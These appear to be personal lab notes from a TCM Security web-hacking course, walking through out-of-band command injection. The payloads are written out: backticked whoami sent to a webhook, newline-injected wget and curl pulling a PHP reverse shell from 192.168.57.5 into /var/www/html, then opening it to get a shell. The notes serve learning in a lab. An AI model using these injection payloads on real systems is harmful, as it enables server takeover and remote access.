
![[Pasted image 20230715153450.png]]

we get OK back

probably from response code 200 OK

test a non existent website name to see response

![[Pasted image 20230715153626.png]]

we get website not found

i/p:
https://tcm-sec.com ; whoami; asd

![[Pasted image 20230715153802.png]]

we get OK again but out ; are being filtered

i/p:

https://webhook.site/c50292e9-da33-4700-a16c-a67e8da/? \`whoami\`

whoami inside  backtiks which will be interpreted as a command and executed

![[Pasted image 20230715154505.png]]

o/p on webhook

![[Pasted image 20230715154539.png]]

user is www-data

this is out of band command injection since we have to catch it at other place reather than it being reflected back to us

i/p:

https://tcm-sec.com \\n wget http://192.168.57.5:8080/test

\\n to go to new line and execute the command

run 
python3 -m http.server 8080
port 80 already in use by tcm lab

![[Pasted image 20230715155113.png]]

![[Pasted image 20230715155440.png]]

edit the port and IP

![[Pasted image 20230715155552.png]]

renamed the file to rev.php

start http server again in /tmp folder when rev.php resides

i/p:
https://tcm-sec.com \\n wget http://192.168.57.5:8080/rev.php

or
```sh
https://tcm-sec.com && curl 192.168.57.5/rev/php > /var/www/html/rev.php
```


output the data of curl to /var/www/html/ directory

![[Pasted image 20230716004644.png]]

go to 

localhost/labs/uploads/rev.php
and we get a reverse shell

![[Pasted image 20230716004541.png]]

and we get back a shell

